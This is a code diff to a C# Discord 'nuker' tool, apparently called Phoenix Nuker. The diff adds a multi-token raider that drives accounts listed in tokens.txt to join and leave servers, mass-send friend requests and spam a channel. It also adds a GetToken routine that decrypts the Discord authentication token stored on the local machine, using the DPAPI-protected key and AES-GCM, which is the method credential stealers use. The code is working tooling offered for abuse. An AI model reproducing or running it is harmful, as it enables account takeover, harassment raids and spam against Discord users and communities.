@@ -11,6 +11,14 @@ using Console = Colorful.Console;
 using System.Net.Http;
 using System.Diagnostics;
 using System.Reflection;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using System.Linq;
+using System.Security.Cryptography;
+using Org.BouncyCastle.Crypto.Engines;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Collections.Generic;
 
 /* 
        │ Author       : extatent
@@ -23,7 +31,7 @@ namespace nuker
     class Program
     {
         #region Configs
-        public static string version = "2";
+        public static string version = "3";
         public static string token;
         public static int WaitTimeShort = 200;
         public static int WaitTimeLong = 2000;
@@ -55,6 +63,7 @@ namespace nuker
         }
 
         static DiscordSocketClient client = new DiscordSocketClient();
+        static List<DiscordClient> clients = new List<DiscordClient>();
         static string guildid;
         #endregion
 
@@ -139,49 +148,111 @@ namespace nuker
                     Environment.Exit(0);
                 }
             }
-            GetConfig();
-            if (string.IsNullOrEmpty(token))
+
+            string tokens = "tokens.txt";
+            if (!File.Exists(tokens))
             {
                 try
                 {
-                    Console.Write("Token: ");
-                    string token = Console.ReadLine();
-                    if (token.Contains("\""))
-                    {
-                        token = token.Replace("\"", "");
-                    }
-
-                    SaveConfig(token);
-
-                    client.Login(token);
+                    File.Create(tokens).Dispose();
                 }
-                catch (Exception ex)
+                catch
                 {
-                    Console.WriteLine(ex.Message);
-                    Thread.Sleep(WaitTimeLong);
-                    if (File.Exists("config.json"))
-                    {
-                        File.Delete("config.json");
-                    }
-                    Start();
+                    Environment.Exit(0);
                 }
             }
-            else
+
+            GetConfig();
+
+            Console.WriteLine("{0,-20} {1,34}", "[1] Login with user token", "[2] Login with your token");
+            Console.WriteLine("{0,-20} {1,21}", "[3] MultiToken Raider", "[4] Exit");
+
+            Console.WriteLine();
+            Console.Write("Your choice: ");
+            int options = Convert.ToInt32(Console.ReadLine());
+            switch (options)
             {
-                try
-                {
-                    client.Login(token);
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                    Thread.Sleep(WaitTimeLong);
-                    if (File.Exists("config.json"))
+                default:
+                    Console.WriteLine("Not a valid option.");
+                    DoneMethod4();
+                    break;
+                case 1:
+                    if (string.IsNullOrEmpty(token))
                     {
-                        File.Delete("config.json");
+                        try
+                        {
+                            Console.Write("Token: ");
+                            string token = Console.ReadLine();
+                            if (token.Contains("\""))
+                            {
+                                token = token.Replace("\"", "");
+                            }
+
+                            SaveConfig(token);
+
+                            client.Login(token);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(WaitTimeLong);
+                            if (File.Exists("config.json"))
+                            {
+                                File.Delete("config.json");
+                            }
+                            Start();
+                        }
                     }
-                    Start();
-                }
+                    else
+                    {
+                        try
+                        {
+                            client.Login(token);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(WaitTimeLong);
+                            if (File.Exists("config.json"))
+                            {
+                                File.Delete("config.json");
+                            }
+                            Start();
+                        }
+                    }
+                    break;
+                case 2:
+                    try
+                    {
+                        client.Login(GetToken());
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                        Thread.Sleep(WaitTimeLong);
+                        Start();
+                    }
+                    break;
+                case 3:
+                    var TokenList = File.ReadAllLines("tokens.txt");
+
+                    int count = 0;
+
+                    foreach (var token in TokenList)
+                    {
+                        count++;
+
+                        DiscordClient client = new DiscordClient(token);
+
+                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
+
+                        clients.Add(client);
+                    }
+                    Raider();
+                    break;
+                case 4:
+                    Environment.Exit(0);
+                    break;
             }
 
             WriteLogo();
@@ -420,6 +491,92 @@ namespace nuker
         }
         #endregion
 
+        #region Raider
+        static void Raider()
+        {
+            WriteLogo();
+
+            Console.ForegroundColor = Color.Yellow;
+            Console.WriteLine("{0,-20} {1,26}", "[1] Joiner", "[2] Leaver");
+            Console.WriteLine("{0,-20} {1,27}", "[3] Friender", "[4] Spammer");
+            Console.WriteLine("{0,-20} {1,24}", "[5] Go Back", "[6] Exit");
+
+            Console.WriteLine();
+            Console.Write("Your choice: ");
+            int option = Convert.ToInt32(Console.ReadLine());
+            switch (option)
+            {
+                default:
+                    Console.WriteLine("Not a valid option.");
+                    Thread.Sleep(WaitTimeLong);
+                    Console.Clear();
+                    Raider();
+                    break;
+                case 1:
+                    Console.Clear();
+                    WriteLogo();
+                    Console.Write("Invite code: ");
+                    string code = Console.ReadLine();
+                    Console.Clear();
+                    WriteLogo();
+                    foreach (var joiner in clients)
+                    {
+                        joiner.JoinGuild(code);
+                    }
+                    Raider();
+                    break;
+                case 2:
+                    Console.Clear();
+                    WriteLogo();
+                    Console.Write("Guild ID: ");
+                    ulong id = ulong.Parse(Console.ReadLine());
+                    Console.Clear();
+                    WriteLogo();
+                    foreach (var leaver in clients)
+                    {
+                        leaver.LeaveGuild(id);
+                    }
+                    Raider();
+                    break;
+                case 3:
+                    Console.Clear();
+                    WriteLogo();
+                    Console.Write("User ID: ");
+                    ulong uid = ulong.Parse(Console.ReadLine());
+                    Console.Clear();
+                    WriteLogo();
+                    foreach (var friender in clients)
+                    {
+                        friender.SendFriendRequest(uid);
+                    }
+                    Raider();
+                    break;
+                case 4:
+                    Console.Clear();
+                    WriteLogo();
+                    Console.Write("Channel ID: ");
+                    ulong cid = ulong.Parse(Console.ReadLine());
+                    Console.Clear();
+                    WriteLogo();
+                    Console.Write("Message: ");
+                    string msg = Console.ReadLine();
+                    Console.Clear();
+                    WriteLogo();
+                    foreach (var spammer in clients)
+                    {
+                        spammer.SendMessage(cid, msg);
+                    }
+                    Raider();
+                    break;
+                case 5:
+                    Start();
+                    break;
+                case 6:
+                    Environment.Exit(0);
+                    break;
+            }
+        }
+        #endregion
         #region Account nuker
         static void AccountNuker()
         {
@@ -941,6 +1098,47 @@ namespace nuker
                     Environment.Exit(0);
                     break;
             }
+        }
+        #endregion
+
+        #region Get Token
+        static string GetToken()
+        {
+            string token = "";
+
+            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
+
+            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
+            foreach (string file in dbfiles)
+            {
+                FileInfo info = new FileInfo(file);
+                string contents = File.ReadAllText(info.FullName);
+
+                Match match = EncryptedRegex.Match(contents);
+                if (match.Success)
+                {
+                    token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
+                }
+            }
+
+            return token;
+        }
+
+        static byte[] DecyrptKey(string path)
+        {
+            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
+            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
+        }
+
+        static string DecryptToken(byte[] buffer)
+        {
+            byte[] EncryptedData = buffer.Skip(15).ToArray();
+            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
+            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
+            BlockCipher.Init(false, Params);
+            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
+            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
+            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
         }
         #endregion
     }
